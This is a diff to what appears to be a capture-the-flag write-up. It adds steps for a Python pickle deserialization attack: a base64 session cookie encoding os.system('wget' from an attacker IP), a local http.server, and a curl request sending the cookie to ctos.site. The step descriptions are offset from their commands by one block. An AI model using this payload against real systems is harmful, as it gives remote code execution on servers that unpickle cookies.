@@ -368,7 +368,19 @@ gAWVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJ3Z2V0IGh0dHA6Ly8xMC4yMDAuODguMTU4L3Rl
 Ill then run the script to make the session
 
 ```python
-python3 -
+python3 -m http.server 80
+```
+
+Ill then start a webserver
+
+```python
+curl http://ctos.site/ -H 'Cookie: ctos_session=gAWVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJ3Z2V0IGh0dHA6Ly8xMC4yMDAuODguMTU4L3Rlc3QudHh0lIWUUpQu'
+```
+
+Then ill send the request to the site using the malicious session
+
+```python
+
 ```
 
 
